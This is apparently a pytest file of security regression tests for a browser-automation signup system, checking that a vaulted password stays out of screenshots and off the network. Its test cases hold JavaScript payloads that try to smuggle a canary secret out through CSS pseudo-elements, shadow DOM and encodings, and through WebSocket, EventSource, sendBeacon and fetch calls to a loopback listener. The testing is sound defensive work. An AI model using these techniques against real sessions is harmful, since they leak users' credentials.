"""Round-2 independent audit FAIL scenarios, kept as permanent tests (loopback fixture only).

Screenshot tests compare a capture made while the page shows the canary against one made
while the page shows a same-length filler: the images must be byte-identical, so no canary
pixel can exist. A control proves the raw page really differs."""
import base64
import socket
import threading
import time

import pytest

from test_signup import start

CANARY = 'ROUND2_SECRET_CANARY_90417'


def prime(env):
    site, vault, inbox, p, store, e, password, token = env
    vault.put('signup-password', CANARY)
    run = start(env)
    e.approve('owner', run['id'], run['inspection_digest'])
    e.submit('owner', run['id'])
    return run, e.sessions[run['id']][1]


def shot(env, run, tmp_path, name):
    target = tmp_path/name
    env[5].screenshot('owner', run['id'], target)
    return target.read_bytes()


# Each scenario takes the text to show and arranges for it to be on the page.
SCENARIOS = {
    'per_char_spans_in_h1': """(t)=>{const h=document.querySelector('h1');h.textContent='';
        for(const c of t){const s=document.createElement('span');s.textContent=c;h.appendChild(s)}}""",
    'h1_after_pseudo_element': """(t)=>{let s=document.getElementById('x1');
        if(!s){s=document.createElement('style');s.id='x1';document.head.appendChild(s)}
        s.textContent='h1::after{content:"'+t+'";font-size:30px}'}""",
    'h1_before_pseudo_element': """(t)=>{let s=document.getElementById('x1');
        if(!s){s=document.createElement('style');s.id='x1';document.head.appendChild(s)}
        s.textContent='h1::before{content:"'+t+'";font-size:30px}'}""",
    'open_shadow_dom': """(t)=>{let h=document.getElementById('sh');
        if(!h){h=document.createElement('div');h.id='sh';document.querySelector('main').appendChild(h);
        h.attachShadow({mode:'open'})}
        h.shadowRoot.innerHTML='<p style="font-size:26px">'+t+'</p>'}""",
    'shadow_inside_kept_h1': """(t)=>{const h=document.querySelector('h1');
        const r=h.shadowRoot||h.attachShadow({mode:'open'});r.innerHTML='<b>'+t+'</b>'}""",
    'base64_inside_kept_h1': """(t)=>{document.querySelector('h1').textContent=btoa(t)}""",
    'reversed_inside_kept_h1': """(t)=>{document.querySelector('h1').textContent=[...t].reverse().join('')}""",
    'raw_in_policy': """(t)=>{let p=document.querySelector('#policy');if(!p){p=document.createElement('p');p.id='policy';
        document.querySelector('main').appendChild(p)}p.textContent=t}""",
    'attribute_content_h1': """(t)=>{let s=document.getElementById('x1');
        if(!s){s=document.createElement('style');s.id='x1';document.head.appendChild(s)}
        document.querySelector('h1').setAttribute('data-v',t);
        s.textContent='h1::after{content:attr(data-v);font-size:30px}'}""",
}


def shown(name, text):
    # The transformed scenarios show the transformed canary; filler has equal length.
    if name == 'base64_inside_kept_h1':
        return base64.b64encode(text.encode()).decode()
    return text


@pytest.mark.parametrize('name', sorted(SCENARIOS))
def test_screenshot_never_contains_script_chosen_secret_text(env, tmp_path, name):
    run, page = prime(env)
    js = SCENARIOS[name]
    page.evaluate(js, CANARY)
    masked = shot(env, run, tmp_path, 'with.png')
    # Raw control: the unmasked page differs between canary and filler (the leak is real).
    page.screenshot(path=str(tmp_path/'raw_with.png'), full_page=True)
    page.evaluate(js, 'x'*len(CANARY))
    page.screenshot(path=str(tmp_path/'raw_fill.png'), full_page=True)
    assert (tmp_path/'raw_with.png').read_bytes() != (tmp_path/'raw_fill.png').read_bytes()
    filler = shot(env, run, tmp_path, 'fill.png')
    assert masked == filler


class Listener:
    """Raw loopback TCP listener on another port; records whatever bytes arrive."""
    def __init__(self):
        self.sock = socket.socket()
        self.sock.bind(('127.0.0.1', 0))
        self.sock.listen(8)
        self.port = self.sock.getsockname()[1]
        self.data, self.connections = b'', 0
        threading.Thread(target=self.run, daemon=True).start()

    def run(self):
        while True:
            try:
                conn, _ = self.sock.accept()
            except OSError:
                return
            self.connections += 1
            conn.settimeout(1)
            try:
                self.data += conn.recv(65536)
                conn.sendall(b'HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\n\r\n')
            except OSError:
                pass
            conn.close()

    def close(self):
        self.sock.close()


@pytest.fixture
def listener():
    l = Listener()
    yield l
    l.close()


def test_websocket_cannot_carry_password_to_another_loopback_port(env, listener):
    run, page = prime(env)
    page.evaluate("""([port,p])=>{try{const w=new WebSocket('ws://127.0.0.1:'+port+'/?p='+encodeURIComponent(p));
        w.onopen=()=>w.send(p)}catch(e){}}""", [listener.port, CANARY])
    page.wait_for_timeout(800)
    assert listener.connections == 0 and CANARY.encode() not in listener.data


def test_websocket_to_the_approved_origin_never_reaches_the_server(env):
    run, page = prime(env)
    site = env[0]
    before = list(site.requests)
    origin = site.origin.replace('http://', 'ws://')
    page.evaluate("""(o)=>{const w=new WebSocket(o+'/signup');w.onopen=()=>w.send('x')}""", origin)
    page.wait_for_timeout(800)
    assert site.requests == before


def test_websocket_from_a_subframe_is_blocked(env, listener):
    run, page = prime(env)
    page.evaluate("""([port,p])=>{const f=document.createElement('iframe');document.body.appendChild(f);
        try{new f.contentWindow.WebSocket('ws://127.0.0.1:'+port+'/?p='+p)}catch(e){}}""", [listener.port, CANARY])
    page.wait_for_timeout(800)
    assert listener.connections == 0 and CANARY.encode() not in listener.data


def test_eventsource_cannot_reach_another_port(env, listener):
    run, page = prime(env)
    page.evaluate("""([port,p])=>{try{new EventSource('http://127.0.0.1:'+port+'/?p='+p)}catch(e){}}""",
                  [listener.port, CANARY])
    page.wait_for_timeout(800)
    assert listener.connections == 0 and CANARY.encode() not in listener.data


def test_beacon_and_cors_fetch_cannot_reach_another_port(env, listener):
    run, page = prime(env)
    page.evaluate("""([port,p])=>{try{navigator.sendBeacon('http://127.0.0.1:'+port+'/',p)}catch(e){}
        fetch('http://127.0.0.1:'+port+'/',{method:'POST',mode:'no-cors',body:p}).catch(()=>{})}""",
                  [listener.port, CANARY])
    page.wait_for_timeout(800)
    assert listener.connections == 0 and CANARY.encode() not in listener.data


def test_webrtc_and_webtransport_are_unavailable_even_in_new_frames(env):
    run, page = prime(env)
    out = page.evaluate("""()=>{const f=document.createElement('iframe');document.body.appendChild(f);
        const names=['RTCPeerConnection','webkitRTCPeerConnection','WebTransport','EventSource'];
        return names.map(n=>typeof window[n]+'/'+typeof f.contentWindow[n])}""")
    assert out == ['undefined/undefined']*4
    reached = page.evaluate("()=>{try{new RTCPeerConnection();return true}catch(e){return false}}")
    assert reached is False
